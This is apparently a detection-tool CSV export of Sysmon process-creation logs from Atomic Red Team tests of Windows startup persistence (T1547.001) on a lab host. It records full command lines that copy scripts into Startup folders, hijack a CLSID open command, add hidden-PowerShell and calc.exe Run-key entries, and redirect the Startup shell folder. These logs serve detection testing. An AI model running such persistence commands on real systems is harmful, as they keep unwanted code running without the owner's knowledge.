"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-26 11:18:57.140 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173593,"Cmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\"""" Start-Process \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Start-Process \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\"""" Start-Process \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Start-Process \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:57.126","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:02.945 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173603,"Cmdline: C:\WINDOWS\system32\cmd.exe /c """"C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"" "" ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\"""" Start-Process \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Start-Process \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\""""} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 5672 ¦ PGUID: E9F06A57-6116-694E-7F01-000000002400 ¦ ParentPID: 8056 ¦ ParentPGUID: E9F06A57-6111-694E-7D01-000000002400 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\"""" Start-Process \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Start-Process \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\""""} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:02.927","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:04.607 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173604,"Cmdline: C:\WINDOWS\system32\cmd.exe /c """"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"" "" ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\"""" Start-Process \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Start-Process \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\""""} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1080 ¦ PGUID: E9F06A57-6118-694E-8101-000000002400 ¦ ParentPID: 8056 ¦ ParentPGUID: E9F06A57-6111-694E-7D01-000000002400 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\"""" Start-Process \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Start-Process \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\""""} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:04.592","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:05.217 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173605,"Cmdline: ""powershell.exe"" & {$Target = \""""C:\Windows\System32\calc.exe\"""" $ShortcutLocation = \""""$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk\"""" $WScriptShell = New-Object -ComObject WScript.Shell $Create = $WScriptShell.CreateShortcut($ShortcutLocation) $Create.TargetPath = $Target $Create.Save()} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 5588 ¦ PGUID: E9F06A57-6119-694E-8301-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$Target = \""""C:\Windows\System32\calc.exe\"""" $ShortcutLocation = \""""$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk\"""" $WScriptShell = New-Object -ComObject WScript.Shell $Create = $WScriptShell.CreateShortcut($ShortcutLocation) $Create.TargetPath = $Target $Create.Save()} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:05.197","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:06.918 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173608,"Cmdline: ""cmd.exe"" /c reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1688 ¦ PGUID: E9F06A57-611A-694E-8601-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:06.905","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:06.984 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173609,"Cmdline: reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 3644 ¦ PGUID: E9F06A57-611A-694E-8801-000000002400 ¦ ParentPID: 1688 ¦ ParentPGUID: E9F06A57-611A-694E-8601-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:06.973","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:07.229 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173611,"Cmdline: ""C:\WINDOWS\system32\sc.exe"" start pushtoinstall login ¦ Proc: C:\Windows\System32\sc.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 3572 ¦ PGUID: E9F06A57-611B-694E-8901-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: Service Control Manager Configuration Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=9C210CDD9F05530777868F4C8530C438,SHA256=845607864FC7E60304D8C45AE42884B32710781DAA33DA9D01416C77D2E0BE1D,IMPHASH=42DADBD60BBC453DD1773FDC089E19B7","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ OriginalFileName: sc.exe ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:19:07.215","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:07.235 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173612,"Cmdline: taskhostw.exe Logon ¦ Proc: C:\Windows\System32\taskhostw.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 8468 ¦ PGUID: E9F06A57-611B-694E-8A01-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: Host Process for Windows Tasks ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3979F5BBEC9B7637719F9A096400A24A,SHA256=CAAAFB0C6F77CD37F402E644FC56B7D89E3D5FC51E128A4AC49481D281E582F8,IMPHASH=2196268E7A2880E3ADC74481297D0C4B","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: Medium ¦ OriginalFileName: taskhostw.exe ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ ParentUser: NT AUTHORITY\SYSTEM ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:07.231","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:07.443 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173613,"Cmdline: ""powershell.exe"" & {$RunKey = \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\"""" Set-ItemProperty -Path $RunKey -Name \""""socks5_powershell\"""" -Value \""""powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8680 ¦ PGUID: E9F06A57-611B-694E-8C01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$RunKey = \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\"""" Set-ItemProperty -Path $RunKey -Name \""""socks5_powershell\"""" -Value \""""powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:07.428","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:08.229 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173616,"Cmdline: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Common Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8884 ¦ PGUID: E9F06A57-611C-694E-8E01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Common Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:08.218","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:11.021 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173619,"Cmdline: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9204 ¦ PGUID: E9F06A57-611F-694E-9001-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:11.003","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:12.412 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173623,"Cmdline: ""powershell.exe"" & {if (!(Test-Path -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\"""")){ New-Item -ItemType Key -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\"""" } if (!(Test-Path -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""")){ New-Item -ItemType Key -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" } Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" -Name \""""atomictest\"""" -Value \""""C:\Windows\System32\calc.exe\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8004 ¦ PGUID: E9F06A57-6120-694E-9201-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {if (!(Test-Path -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\"""")){ New-Item -ItemType Key -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\"""" } if (!(Test-Path -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""")){ New-Item -ItemType Key -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" } Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" -Name \""""atomictest\"""" -Value \""""C:\Windows\System32\calc.exe\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:12.400","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
